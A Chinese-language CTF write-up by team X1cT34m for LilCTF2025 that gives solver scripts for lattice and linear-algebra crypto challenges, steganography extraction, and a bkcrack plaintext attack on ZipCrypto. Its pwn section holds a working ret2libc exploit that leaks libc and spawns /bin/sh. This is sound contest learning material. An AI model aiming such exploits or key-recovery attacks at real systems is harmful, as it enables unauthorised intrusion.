# LilCTF2025 - X1cT34m

感谢 X1cT34m 的师傅们

@Pure Stream
@soapsama
@Yolo
@Spreng
@SeanDictionary
@2εr00иe

RK.14

RP.2998

# Crypto

## baaaaaag

背包密码，通解板子，调一下 BKZ 的 block 大小就能出了

```
from Crypto.Cipher import AES
from Crypto.Util.number import *
import hashlib

a = [965032030645819473226880279, 699680391768891665598556373, 1022177754214744901247677527, 680767714574395595448529297, 1051144590442830830160656147, 1168660688736302219798380151, 796387349856554292443995049, 740579849809188939723024937, 940772121362440582976978071, 787438752754751885229607747, 1057710371763143522769262019, 792170184324681833710987771, 912844392679297386754386581, 906787506373115208506221831, 1073356067972226734803331711, 1230248891920689478236428803, 713426848479513005774497331, 979527247256538239116435051, 979496765566798546828265437, 836939515442243300252499479, 1185281999050646451167583269, 673490198827213717568519179, 776378201435505605316348517, 809920773352200236442451667, 1032450692535471534282750757, 1116346000400545215913754039, 1147788846283552769049123803, 994439464049503065517009393, 825645323767262265006257537, 1076742721724413264636318241, 731782018659142904179016783, 656162889354758353371699131, 1045520414263498704019552571, 1213714972395170583781976983, 949950729999198576080781001, 1150032993579134750099465519, 975992662970919388672800773, 1129148699796142943831843099, 898871798141537568624106939, 997718314505250470787513281, 631543452089232890507925619, 831335899173370929279633943, 1186748765521175593031174791, 884252194903912680865071301, 1016020417916761281986717467, 896205582917201847609656147, 959440423632738884107086307, 993368100536690520995612807, 702602277993849887546504851, 1102807438605649402749034481, 629539427333081638691538089, 887663258680338594196147387, 1001965883259152684661493409, 1043811683483962480162133633, 938713759383186904819771339, 1023699641268310599371568653, 784025822858960757703945309, 986182634512707587971047731, 1064739425741411525721437119, 1209428051066908071290286953, 667510673843333963641751177, 642828919542760339851273551, 1086628537309368288204342599, 1084848944960506663668298859, 667827295200373631038775959, 752634137348312783761723507, 707994297795744761368888949, 747998982630688589828284363, 710184791175333909291593189, 651183930154725716807946709, 724836607223400074343868079, 1118993538091590299721647899]
b = 34962396275078207988771864327

ciphertext = b'Lo~G\xf46>\xd609\x8e\x8e\xf5\xf83\xb5\xf0\x8f\x9f6&\xea\x02\xfa\xb1_L\x85\x93\x93\xf7,`|\xc6\xbe\x05&\x85\x8bC\xcd\xe6?TV4q'

S = b
M = a

ge = Matrix(ZZ,len(M)+1)
for i in range(len(M)):
    ge[i,i] = 2
    ge[i,-1] = M[i]
    ge[-1,i] = 1
ge[-1,-1] = S
Ge = ge.BKZ(block_size = 30)
# print(Ge)for row in Ge:
    m1, m2 = "", ""
    if row[-1] != 0 or set(row[:-1]) != {-1, 1}:
        continue
    print(row)
    for i in row[:-1]:
        m1 += str((i + 1) // 2)
        m2 += str((i + 1) // 2 ^^ 1)
    p1 = int(m1[::-1],2)
    print(p1)
    p2 = int(m2[::-1],2)
    print(p2)

    key = hashlib.sha256(str(p1).encode()).digest()
    cipher = AES.new(key, AES.MODE_ECB)
    flag = cipher.decrypt(ciphertext)
    print(flag)

    key = hashlib.sha256(str(p2).encode()).digest()
    cipher = AES.new(key, AES.MODE_ECB)
    flag = cipher.decrypt(ciphertext)
    print(flag)

# LILCTF{M4ybe_7he_brut3_f0rce_1s_be5t}
```

## Space Travel

一开始无脑写格发现 800\*600 的复杂度太大，后面开始考虑从仿射子空间思考，发现 vecs 是个 13 维的向量空间，但是 vecs 长度为 4096 应该对应的是个 12 维的空间，这样才能正好把 800 位的 key 映射为 600 位，然后就能利用已知的 600 组关系得出唯一解。

所以开始考虑把 13 维变换到 12 维上去，然后测试发现，该 13 维空间是在 12 维空间上加了一个偏移向量产生的，也就是原 12 维空间第一个向量就是原点。也就有这样一个从 16 维到 12 维的映射

$$
v_{12}\cdot G + v_{0} = v_{16}
$$

于是可以将

$$
K_{1\times 800}\cdot N_{800\times 600}=H_{1\times 600}
$$

转化为如下式子

$$
(K'_{1\times 600}\cdot diag(\underbrace{G,G,\cdots ,G} _{50})+v_0)\cdot N_{800\times 600}=H_{1\times 600}
$$

$$
\Rightarrow K'_{1\times 600}\cdot (diag(\underbrace{G,G,\cdots ,G} _{50})\cdot N_{800\times 600}) = H_{1\times 600}-v_0\cdot N_{800\times 600}
$$

解形如

$$
xA=B
$$

的矩阵即可得到映射后的 K，按映射方式转换回去即可得到 key

下面放上 AI 和我手搓的两个 exp，处理思路有一点点不一样，我觉得 AI 的有点复杂

我写的：

```
from Crypto.Cipher import AES
from hashlib import md5

gift = ...
enc = ...
vecs = ...

F = GF(2)

V16 = VectorSpace(F, 16)
V600 = VectorSpace(F, 600)
V800 = VectorSpace(F, 800)

vecs_vec = [V16(list(map(int, b))) for b in vecs]
v0 = vecs_vec[0]
vecs_vec = [v-v0 for v in vecs_vec]

V = span(vecs_vec)
assert V.dimension() == 12

G = Matrix(F, V.basis())    # 12 x 16 matrix

G50 = block_diagonal_matrix([G]*50) # 600 x 800 matrix
v50 = V800([*v0]*50) # 800-dimensional vector

N = Matrix(F, 800, 600)
for i in range(600):
    N.set_column(i, list(map(int, bin(gift[i][0])[2:].zfill(800))))

H = V600([i[1] for i in gift])

A = G50*N
B = H - v50 * N

K = A.solve_left(B)
K = K * G50 + v50
key = int("".join(map(str, K)), 2)
key_md5 = md5(str(key).encode()).digest()
print(f"Key: {key_md5.hex()}")

print(AES.new(key=md5(str(key).encode()).digest(), nonce=b"Tiffany", mode=AES.MODE_CTR).decrypt(enc))

# Key: 6acd53e24eb5b025973a59b501589c4d
# Flag: LILCTF{Un1qUe_s0luti0n_1N_sUbSp4C3!}
```

Gemini 的：

```
from Crypto.Cipher import AES
from hashlib import md5

gift = ...
enc = ...
vecs = ...

print("[*] Step 1: Characterizing the affine subspace...")

# 定义二元有限域 GF(2)
F = GF(2)

# 定义16维向量空间，用于处理 vecs 中的向量
V16 = VectorSpace(F, 16)

# 将 vecs 中的十六进制字符串转换为 GF(2) 上的向量
vecs_vec = [V16(list(map(int, b))) for b in vecs]

# 选择 v0 作为偏移向量
v0 = vecs_vec[0]
print(f"    - Chose translation vector v0: {v0}")

# 计算线性子空间 W 的生成元
W_gens = [v - v0 for v in vecs_vec]

# 创建线性子空间 W 并计算其基
W = V16.subspace(W_gens)
W_basis = W.basis()

# 检查维度是否为12
if len(W_basis) != 12:
    print(f"[!] Warning: Dimension of the linear subspace is {len(W_basis)}, expected 12.")
else:
    print(f"    - Successfully found a basis of 12 vectors for the linear subspace W.")

# --- 第 2 步: 构建 600x600 的线性方程组 ---

print("\n[*] Step 2: Building the 600x600 linear system...")

# 定义800维向量空间，用于处理完整的密钥和nonce
V800 = VectorSpace(F, 800)

# 计算 800 位的基准密钥 K_base (v0 || v0 || ... || v0)
K_base_list = []
for _ in range(50):
    K_base_list.extend(v0)
K_base = V800(K_base_list)

# 构建 600 个 800 维的扩展基向量 B_{j,i}
# B_vectors[k] 对应未知数 c_{j,i}，其中 k = j*12 + i
B_vectors = []
for j in range(50):       # 对应 50 个块
    for i in range(12):   # 对应 12 个基向量
        temp_vec = V800.zero_vector()
        # 将第 i 个基向量 b_i 放置在第 j 个块的位置
        for bit_idx in range(16):
            temp_vec[j*16 + bit_idx] = W_basis[i][bit_idx]
        B_vectors.append(temp_vec)

# 初始化系数矩阵 M 和常数向量 y
M = matrix(F, 600, 600)
y = vector(F, 600)

# 填充矩阵 M 和向量 y
for k in range(600):
    nonce_int, parity = gift[k]
    # 将 nonce 整数转换为 800 位向量
    # Sage 的 integer_to_vector 默认是 little-endian，但对于点积不影响
    n_vec = V800([int(bit) for bit in bin(nonce_int)[2:].zfill(800)])

    # 计算方程右边的常数项: parity + (n · K_base)
    y[k] = parity + n_vec.dot_product(K_base)

    # 计算方程左边的系数 (矩阵 M 的一行)
    for l in range(600):
        M[k, l] = n_vec.dot_product(B_vectors[l])

print("    - System Ax=b constructed successfully.")

# --- 第 3 步: 求解方程并恢复密钥 ---

print("\n[*] Step 3: Solving the system and reconstructing the key...")

try:
    # 求解 c_{j,i} 系数
    coeffs = M.solve_right(y)
    print("    - System solved. Found the 600 coefficients.")
except ValueError:
    print("[!] Error: The matrix is singular. Cannot find a unique solution.")
    exit()

# 使用系数恢复50个16位密钥块
key_blocks = []
for j in range(50):
    current_block = v0
    for i in range(12):
        # c_{j,i} * b_i
        coeff_idx = j * 12 + i
        term = coeffs[coeff_idx] * W_basis[i]
        current_block += term
    key_blocks.append(current_block)

# 拼接所有块得到完整的800位密钥向量
key_vec_list = []
for block in key_blocks:
    key_vec_list.extend(block)
key_vec = V800(key_vec_list)

# 将密钥向量转换为大整数
key_int_str = "".join(map(str, key_vec))
key_int = int(key_int_str, 2)

print(f"    - Successfully reconstructed the 800-bit key.")
# print(f"    - Key (int): {key_int}")

# --- 第 4 步: 解密 Flag ---

print("\n[*] Step 4: Decrypting the flag...")

# 计算AES密钥
aes_key = md5(str(key_int).encode()).digest()
print(f"    - AES Key (hex): {aes_key.hex()}")

# 使用 AES-CTR 进行解密
cipher = AES.new(key=aes_key, mode=AES.MODE_CTR, nonce=b"Tiffany")
flag = cipher.decrypt(enc)

print("\n" + "="*40)
print(flag)
print("="*40)
```

```
[*] Step 1: Characterizing the affine subspace...
    - Chose translation vector v0: (0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0)
    - Successfully found a basis of 12 vectors for the linear subspace W.

[*] Step 2: Building the 600x600 linear system...
    - System Ax=b constructed successfully.

[*] Step 3: Solving the system and reconstructing the key...
    - System solved. Found the 600 coefficients.
    - Successfully reconstructed the 800-bit key.

[*] Step 4: Decrypting the flag...
    - AES Key (hex): 6acd53e24eb5b025973a59b501589c4d

========================================
b'LILCTF{Un1qUe_s0luti0n_1N_sUbSp4C3!}'
========================================
```

## Linear

和背包密码类似，直接构造格，为了保证目标向量最后为 0，需要整体乘以 K，最后一项为 0 时，得到的 x 一定是一组有效解。

$$
\left( x_1, x_2, \ldots, x_n, 1 \right) \begin{bmatrix} 1 & 0 & \cdots & 0 & K a_1 \\ 0 & 1 & \cdots & 0 & K a_2 \\ \vdots & \vdots & \ddots & \vdots & \vdots \\ 0 & 0 & \cdots & 1 & K a_n \\ 0 & 0 & \cdots & 0 & -K b \end{bmatrix} = \left( x_1, x_2, \ldots, x_n, 0 \right)
$$

```
from fpylll import IntegerMatrix, LLL, FPLLL
from Crypto.Util.number import *
import random
from pwn import *
import ast

# import re


def process_matrices(matrix1, matrix2):
    nrows = 16
    ncols = 32

    # A = [[random.randint(1, 1919810) for _ in range(ncols)] for _ in range(nrows)]
    # x = [random.randint(1, 114514) for _ in range(ncols)]
    # b = [sum(A[i][j] * x[j] for j in range(ncols)) for i in range(nrows)]
    A = matrix1
    b = matrix2
    K = 1000000

    # print(f"A = {A}")
    # print(f"b = {b}")
    # print(f"x = {x}")
    dim = nrows + ncols

    M = IntegerMatrix(dim, dim)

    for i in range(ncols):
        M[i, i] = 1
        for j in range(nrows):
            M[i, ncols + j] = A[j][i] * K

    for j in range(nrows):
        M[ncols, ncols + j] = -b[j] * K

    L = LLL.reduction(M)

    for line in M:
        line = list(line)
        if all(x == 0 for x in line[ncols:]) and all(x != 0 for x in line[:ncols]):
            # print(f"x = {line[:ncols]}")
            return line[:ncols]


def parse_matrix(matrix_str):
    """将字符串形式的矩阵解析为二维列表"""
    # 去除空行并分割每行
    lines = [line.strip() for line in matrix_str.strip().split("\n") if line.strip()]
    # 分割每行元素并转换为整数
    return [list(map(int, line.split())) for line in lines]


def format_matrix(matrix):
    """将二维列表格式化为字符串形式的矩阵"""
    return "\n".join([" ".join(map(str, row)) for row in matrix]) + "\n"


def main():
    # 配置连接信息
    host = "challenge.xinshi.fun"  # 替换为目标主机地址
    port = 42749  # 替换为目标端口

    # 建立连接
    try:
        io = remote(host, port)
        print(f"成功连接到 {host}:{port}")
    except Exception as e:
        print(f"连接失败: {e}")
        return

    try:
        # io.interactive()
        # 接收第一个矩阵
        print("接收第一个矩阵...")
        matrix1_str = io.recvline().decode().strip()
        matrix1 = ast.literal_eval(matrix1_str)

        # 接收第二个矩阵
        print("接收第二个矩阵...")
        matrix2_str = io.recvline().decode().strip()
        matrix2 = ast.literal_eval(matrix2_str)

        # 等待服务器提示
        print(io.recvuntil(":").decode().strip())

        # 处理矩阵
        print("处理矩阵中...")
        result_matrix = process_matrices(matrix1, matrix2)
        print(result_matrix)

        # 发送结果矩阵
        print("发送结果矩阵...")
        result_str = " ".join(map(str, result_matrix))
        io.sendline(result_str.encode())

        # 等待服务器提示
        print(io.recvline())
        io.interactive()

        # 可以根据需要接收服务器的响应
        # response = p.recvall().decode()
        # print(f"服务器响应: {response}")

    except Exception as e:
        print(f"处理过程中出错: {e}")
    finally:
        # 关闭连接
        io.close()
        print("\n连接已关闭")


if __name__ == "__main__":
    main()
```

由于限时 10 秒，只能用脚本提交，这里用在 linux 下用 fpylll 库代替 sage 的 LLL。

```
┌──(my-venv)(root㉿Spreng)-[/home/spreng/work]
└─# python l.py
[+] Opening connection to challenge.xinshi.fun on port 42749: Done
成功连接到 challenge.xinshi.fun:42749
接收第一个矩阵...
接收第二个矩阵...
/home/spreng/work/l.py:84: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  print(io.recvuntil(":").decode().strip())
Enter your solution:
处理矩阵中...
[25959, 83641, 102653, 27149, 93181, 56, 57217, 110724, 10708, 102370, 21136, 17936, 93512, 99679, 77682, 57788, 29224, 86747, 19551, 30349, 11090, 65057, 109302, 89730, 5474, 37177, 84033, 69633, 19653, 47319, 32133, 62434]
发送结果矩阵...
b' Bravo! Here is your flag:\n'
[*] Switching to interactive mode
LILCTF{b473e5e6-9b84-48ac-9668-8849813bff84}
```

## **ez_math**

```
v1 = [getPrime(128), getPrime(128)]
v2 = [getPrime(128), getPrime(128)]

A = matrix(GF(p), [v1, v2])
B = matrix(GF(p), [mul(v1, lambda1), mul(v2, lambda2)])
C = A.inverse() * B
```

C 和 diag(lambda1, lambda2)是相似矩阵，计算特征值即可。

```
from Crypto.Util.number import *

p = 9620154777088870694266521670168986508003314866222315790126552504304846236696183733266828489404860276326158191906907396234236947215466295418632056113826161
C = [
    [
        7062910478232783138765983170626687981202937184255408287607971780139482616525215270216675887321965798418829038273232695370210503086491228434856538620699645,
        7096268905956462643320137667780334763649635657732499491108171622164208662688609295607684620630301031789132814209784948222802930089030287484015336757787801,
    ],

[
    7341430053606172329602911405905754386729224669425325419124733847060694853483825396200841609125574923525535532184467150746385826443392039086079562905059808,
    2557244298856087555500538499542298526800377681966907502518580724165363620170968463050152602083665991230143669519866828587671059318627542153367879596260872,
]]

C = matrix(GF(p), C)  # 示例矩阵C

# 求C的特征值（即λ1和λ2）
eigenvalues = C.eigenvalues()
lambda1, lambda2 = eigenvalues

m1, m2 = long_to_bytes(int(lambda1)), long_to_bytes(int(lambda2))

flag = b"LILCTF{" + m1 + m2 + b"}"
print(flag)
```

## **mid_math**

矩阵 DLP

```
from Crypto.Util.number import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

p = 14668080038311483271
C = [[11315841881544731102, 2283439871732792326, 6800685968958241983, 6426158106328779372, 9681186993951502212], [4729583429936371197, 9934441408437898498, 12454838789798706101, 1137624354220162514, 8961427323294527914], [12212265161975165517, 8264257544674837561, 10531819068765930248, 4088354401871232602, 14653951889442072670], [6045978019175462652, 11202714988272207073, 13562937263226951112, 6648446245634067896, 13902820281072641413], [1046075193917103481, 3617988773170202613, 3590111338369894405, 2646640112163975771, 5966864698750134707]]
D = [[1785348659555163021, 3612773974290420260, 8587341808081935796, 4393730037042586815, 10490463205723658044], [10457678631610076741, 1645527195687648140, 13013316081830726847, 12925223531522879912, 5478687620744215372], [9878636900393157276, 13274969755872629366, 3231582918568068174, 7045188483430589163, 5126509884591016427], [4914941908205759200, 7480989013464904670, 5860406622199128154, 8016615177615097542, 13266674393818320551], [3005316032591310201, 6624508725257625760, 7972954954270186094, 5331046349070112118, 6127026494304272395]]
msg = b"\xcc]B:\xe8\xbc\x91\xe2\x93\xaa\x88\x17\xc4\xe5\x97\x87@\x0fd\xb5p\x81\x1e\x98,Z\xe1n`\xaf\xe0%:\xb7\x8aD\x03\xd2Wu5\xcd\xc4#m'\xa7\xa4\x80\x0b\xf7\xda8\x1b\x82k#\xc1gP\xbd/\xb5j"
n = 5


G = matrix(GF(p), n, n, C)
H = matrix(GF(p), n, n, D)

G_Jor, P = G.jordan_form(transformation=True)
H_Jor = ~P * H * P


print(G_Jor, H_Jor)
key = discrete_log(H_Jor[1][1], G_Jor[1][1], p-1)
key = pad(long_to_bytes(key), 16)
aes = AES.new(key,AES.MODE_ECB)
flag = aes.decrypt(pad(msg, 64))
print(flag)
# b'LILCTF{Are_y0u_5till_4wake_que5t1on_m4ker!}\x15\x15\x15\x15\x15\x15\x15\x15\x15\x15\x15\x15\x15\x15\x15\x15\x15\x15\x15\x15\x15\xd5\x98\x0f\xd7\xa1\x05\xe8%b:\xb7\x96\xc6\xaf\x05\x1b\xd5\x98\x0f\xd7\xa1\x05\xe8%b:\xb7\x96\xc6\xaf\x05\x1b\xd5\x98\x0f\xd7\xa1\x05\xe8%b:\xb7\x96\xc6\xaf\x05\x1b\xd5\x98\x0f\xd7\xa1\x05\xe8%b:\xb7\x96\xc6\xaf\x05\x1b'
```

# Misc

## PNG Master

直接 zsteg 把 flag1，2 给提取出来

```
yolo@Yolo:~/Desktop/timu$ zsteg 155008_misc-PNG_M@st3r.png
[?] 112 bytes of extra data after image end (IEND), offset = 0x6f8dd
[?] 270 bytes of extra data after zlib stream
extradata:0         .. text: "6K6p5L2g6Zq+6L+H55qE5LqL5oOF77yM5pyJ5LiA5aSp77yM5L2g5LiA5a6a5Lya56yR552A6K+05Ye65p2lZmxhZzE6NGM0OTRjNDM1NDQ2N2I="
extradata:1         .. file: zlib compressed data
    00000000: 78 9c 0b f0 66 66 e1 62  00 81 83 35 bc d1 41 06  |x...ff.b...5..A.|
    00000010: ee ef 14 80 6c 10 06 89  16 a7 26 17 a5 96 e8 25  |....l.....&....%|
    00000020: 65 e6 89 72 32 89 86 f9  b9 86 84 38 86 39 bb 06  |e..r2......8.9..|
    00000030: 84 38 04 08 b9 c6 84 8a  07 08 b9 85 86 8b 07 3a  |.8.............:|
    00000040: bb 30 06 00 cd 11 01 ea  e0 60 90 ae e5 8d fe 91  |.0.......`......|
    00000050: ce b0 35 1e c8 3b 0c 16  61 60 c8 c8 cc 2b d1 2b  |..5..;..a`...+.+|
    00000060: a9 28 89 f5 35 e4 6a 30  e0 f9 53 25 3b 67 4d 53  |.(..5.j0..S%;gMS|
    00000070: c7 6c fe 82 8e 05 cd 8b  34 7e 4c bf d0 e1 f7 b7  |.l......4~L.....|
    00000080: 69 e3 d2 8d 22 87 0a 77  de 89 5d b7 6d df f3 53  |i..."..w..].m..S|
    00000090: 39 47 27 9b 7e bb b0 c2  2b e4 d6 3b 75 ad 04 a5  |9G'.~...+..;u...|
    000000a0: 39 c7 3a 77 cd fb 74 74  4d f3 67 86 64 85 f8 53  |9.:w..ttM.g.d..S|
    000000b0: 37 ff e9 28 fb bf f9 12  fe b2 27 fc be 82 bf 70  |7..(......'....p|
    000000c0: ec 2d 21 5b 8d 0f 4c 01  de 8c 4c f6 0c b8 bc a3  |.-![..L...L.....|
    000000d0: c2 00 01 0a 50 1a e1 39  2e a8 18 23 83 04 43 ec  |....P..9...#..C.|
    000000e0: 65 5b 23 55 9e 3b 8c 0c  68 00 62 36 2e 2f 22 9b  |e[#U.;..h.b6./".|
    000000f0: ed 81 e4 61 64 93 0f be  ae 9a 81 dd 64 56 36 10  |...ad.......dV6.|
imagedata           .. text: "KNShil\"$"
b1,r,lsb,xy         .. text: "_S&3tZGW}|${"
b1,rgb,lsb,xy       .. text: "5Zyo5oiR5Lus5b+D6YeM77yM5pyJ5LiA5Z2X5Zyw5pa55piv5peg5rOV6ZSB5L2P55qE77yM6YKj5Z2X5Zyw5pa55Y+r5YGa5biM5pybZmxhZzI6NTkzMDc1NWYzNDcyMzM1ZjRk"
b1,bgr,lsb,xy       .. file: OpenPGP Secret Key
b2,bgr,msb,xy       .. file: OpenPGP Public Key
b3,r,msb,xy         .. file: zlib compressed data
b4,r,lsb,xy         .. text: "vu%UUU%EDTgf"
b4,g,lsb,xy         .. text: "7xt7wfyW"
b4,b,lsb,xy         .. text: "\"TE#E3W2"
yolo@Yolo:~/Desktop/timu$ echo "5Zyo5oiR5Lus5b+D6YeM77yM5pyJ5LiA5Z2X5Zyw5pa55piv5peg5rOV6ZSB5L2P55qE77yM6YKj5Z2X5Zyw5pa55Y+r5YGa5biM5pybZmxhZzI6NTkzMDc1NWYzNDcyMzM1ZjRk" | base64 -d
在我们心里，有一块地方是无法锁住的，那块地方叫做希望flag2:5930755f3472335f4dyolo@Yolo:~/Desktop/timu$
yolo@Yolo:~/Desktop/timu$ echo "6K6p5L2g6Zq+6L+H55qE5LqL5oOF77yM5pyJ5LiA5aSp77yM5L2g5LiA5a6a5Lya56yR552A6K+05Ye65p2lZmxhZzE6NGM0OTRjNDM1NDQ2N2I=" | base64 -d
让你难过的事情，有一天，你一定会笑着说出来flag1:4c494c4354467b
zsteg -E "extradata:1" 155008_misc-PNG_M@st3r.png > extracted_data1.zlib
zsteg -E "b3,r,msb,xy" 155008_misc-PNG_M@st3r.png > extracted_data2.zlib
```

上面的我 base64 解码的内容再 form hex 可以拿到部分 flag 的

![](https://seandictionary.top/wp-content/uploads/2025/08/d2087f23-4f0a-4b6e-be64-aa5149982fcd.png)

```
LILCTF{Y0u_4r3_Mas7er_in_PNG}
```

然后这里夹杂的其余部分，我用 zilb 解压，发现那个 extracted 块可以拿到个压缩包

```
import zlib

with open('extracted_data1.zlib', 'rb') as f:
    data1 = f.read()

try:
    decompressed_data1 = zlib.decompress(data1)
    print("--- Data from extracted_data1.zlib ---")
    print(decompressed_data1)
    with open('unpacked1.dat', 'wb') as f_out:
        f_out.write(decompressed_data1)
except Exception as e:
    print(f"Failed to decompress data1: {e}")

print("\n" + "="*50 + "\n")

with open('extracted_data2.zlib', 'rb') as f:
    data2 = f.read()


try:
    decompressed_data2 = zlib.decompress(data2)
    print("--- Data from extracted_data2.zlib ---")
    print(decompressed_data2)

    with open('unpacked2.dat', 'wb') as f_out:
        f_out.write(decompressed_data2)
except Exception as e:
    print(f"Failed to decompress data2: {e}")

---
yolo@Yolo:~/Desktop/timu$ python tiqu.py
--- Data from extracted_data1.zlib ---
b'PK\x03\x04\n\x00\x00\x00\x00\x00\xc1|\r[R0G\xee \x00\x00\x00 \x00\x00\x00\n\x00\x00\x00secret.bin\x15\t\x02\x15VNETTAVCEPT@P\x12E\\U\x17P\x12FUW\x17QCD\x01PK\x03\x04\x14\x00\x00\x00\x08\x00\x1b}\r[\xf8g\x00\xb5_\x00\x00\x00\xc3\x00\x00\x00\x08\x00\x00\x00hint.txt]M1\n\x800\x0c\xfcz\x1d\x9c\xac\x82\x88\x9b\x0fp\x88\xa0\x83\xa2(\xf8\x97\xd0\x88N\xfd\x82\xb1\xa5\xb1\x14\xc2q\xb9\xdc]\xae\xb6\xbe\xe7\xcal\xc5\x935\xf6\xd0\xa8JT\xda\xee\'*`"\x9c\xc6\x89\xba\x9e\xf2\xc5\xac\x83\xf3\x00c _\xca\xd9\xfe,#O\xec\xf4W\xe9\x8cW\xdf O\x13]\xda\x12=(\xf0\x02PK\x01\x02?\x00\n\x00\x00\x00\x00\x00\xc1|\r[R0G\xee \x00\x00\x00 \x00\x00\x00\n\x00$\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00secret.bin\n\x00 \x00\x00\x00\x00\x00\x01\x00\x18\x00]\xd3=2%\x0c\xdc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00PK\x01\x02?\x00\x14\x00\x00\x00\x08\x00\x1b}\r[\xf8g\x00\xb5_\x00\x00\x00\xc3\x00\x00\x00\x08\x00$\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00H\x00\x00\x00hint.txt\n\x00 \x00\x00\x00\x00\x00\x01\x00\x18\x00\xc1\xebz\x98%\x0c\xdc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00PK\x05\x06\x00\x00\x00\x00\x02\x00\x02\x00\xb6\x00\x00\x00\xcd\x00\x00\x00\x00\x00'

==================================================

Failed to decompress data2: Error -3 while decompressing data: invalid stored block lengths
yolo@Yolo:~/Desktop/timu$ mv unpacked1.dat flag.zip
yolo@Yolo:~/Desktop/timu$ unzip flag.zip
Archive:  flag.zip
 extracting: secret.bin
  inflating: hint.txt
---
```

这里的 hint 文本是零宽字符隐写，解密内容是与文件名 xor

![](https://seandictionary.top/wp-content/uploads/2025/08/6749437f-8626-4417-a0c6-2a46149137d1.png)

xor 后，拿到了这个 flag3:k6=/%&&"14~p,2&r3`#!yu8-7d

这里有个小坑，就是异或密钥不能有扩展名，就是说密钥需要换成 secret

```
file_to_decrypt = 'secret.bin'
key_string = 'secret'
output_file = 'final_flag_part.txt'
try:
    with open(file_to_decrypt, 'rb') as f:
        file_content = f.read()

    key_bytes = key_string.encode('utf-8')
    key_len = len(key_bytes)

    decrypted_data = bytearray()

    for i in range(len(file_content)):
        decrypted_byte = file_content[i] ^ key_bytes[i % key_len]
        decrypted_data.append(decrypted_byte)

    final_text = decrypted_data.decode('utf-8', errors='ignore')
    print(">>> 解密成功！最终的flag片段是：")
    print(final_text)

    with open(output_file, 'w') as f:
        f.write(final_text)
    print(f"\n结果也已保存到文件: {output_file}")

except FileNotFoundError:
    print(f"错误: 没有找到文件 '{file_to_decrypt}'")
except Exception as e:
    print(f"发生错误: {e}")


'''
>>> 解密成功！最终的flag片段是：
flag3:61733765725f696e5f504e477d
'''
```

## 提前放出附件

首先看到这里是 store 压缩，显然要用魔数或里面的固定偏移值去进行明文攻击

```
yolo@Yolo:~/Desktop/timu$ bkcrack -L 162101_misc-public-ahead.zip
bkcrack 1.7.1 - 2024-12-21
Archive: 162101_misc-public-ahead.zip
Index Encryption Compression CRC32    Uncompressed  Packed size Name
----- ---------- ----------- -------- ------------ ------------ ----------------
    0 ZipCrypto  Store       fc1c6e41         2048         2060 flag.tar
```

接下来研究了下 tar 压缩包的文件结构,才发现 tar 是种归档文件，里面有好多好多填充字符

```
yolo@Yolo:~/Desktop/timu$ printf '%12s' | tr ' ' '\0' > plaintext_12nulls.bin
yolo@Yolo:~/Desktop/timu$ bkcrack -C 162101_misc-public-ahead.zip -c flag.tar -p plaintext_12nulls.bin -o 157
bkcrack 1.7.1 - 2024-12-21
[17:01:59] Z reduction using 4 bytes of known plaintext
100.0 % (4 / 4)
[17:01:59] Attack on 1286955 Z values at index 164
Keys: 945815e7 4e7a2163 e46b8f88
48.4 % (622641 / 1286955)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 622641
[17:05:14] Keys
945815e7 4e7a2163 e46b8f88
yolo@Yolo:~/Desktop/timu$ bkcrack -C 162101_misc-public-ahead.zip -c flag.tar -k 945815e7 4e7a2163 e46b8f88 -d decrypted_flag.tar
bkcrack 1.7.1 - 2024-12-21
[17:06:37] Writing deciphered data decrypted_flag.tar
Wrote deciphered data (not compressed).
yolo@Yolo:~/Desktop/timu$ tar -xvf decrypted_flag.tar
flag.txt
yolo@Yolo:~/Desktop/timu$ ls
0                                             challenge           plaintext_12nulls.bin  web
0xGame_challenge                              decrypted_flag.tar  plaintext_8bytes.bin
162101_misc-public-ahead.zip                  flag.txt            plaintext.bin
162101_misc-public-ahead.zip:Zone.Identifier  output              plaintext_ustar.bin
yolo@Yolo:~/Desktop/timu$ cat flag.txt
LILCTF{Z1pCRyp70_1s_n0t_5ecur3}
```

## v 我 50(R)MB

这道题挺玄乎的，我在浏览器下载图片，一直被截断，按照 webp 下载的，每个文件都是到 10086 这个大小就自动截断，后来我尝试抓包研究

![](https://seandictionary.top/wp-content/uploads/2025/08/29175969-9fa9-45e9-a9ee-72581b596e91.png)

也没有做啥更改，发现响应包的大小一下到 1090038，已经大了不少了，把 body 部分下载下来，发现就是我要的 flag 图片

![](https://seandictionary.top/wp-content/uploads/2025/08/3a3df60b-0143-48ec-aca7-53bc3304d3e4.png)

# Pwn

## 签到

![](https://seandictionary.top/wp-content/uploads/2025/08/8ec10e1d-ccd2-459e-ba77-85733ad78439.png)

真签到题,ret2libc,没有 pop rdi,用我之前找到的魔术链代替,可以泄露 IO

![](https://seandictionary.top/wp-content/uploads/2025/08/e7c4c8e8-23c4-4c56-bb0d-755ad9516489.png)

```
from pwn import *
io=remote("challenge.xinshi.fun",37827)
libc=ELF('./libc.so.6')

payload=b'a'*0x70+p64(0x404040+0x900)+p64(0x4010D0)+p64(0x4011D6)
io.send(payload)
io.recvuntil(b"What's your name?\n")
base=u64(io.recv(6)+b'\x00\x00')-libc.sym._IO_2_1_stdout_
print(hex(base))
payload=b'a'*0x78+p64(base+0x000000000002a3e5+1)+p64(base+0x000000000002a3e5)+p64(base+next(libc.search("/bin/sh")))+p64(base+libc.sym.system)
io.send(payload)
io.interactive()
```

## heap_Pivoting

根据 hint 可以知道 libc 为 2.23

静态编译的 64 位堆利用,没开 PIE

```
zer00ne@zer00ne-virtual-machine:~/Desktop/new/3$ seccomp-tools dump ./pwn
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005
 0004: 0x06 0x00 0x00 0x00000000  return KILL
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

开启了沙箱,禁止了 execve 的调用

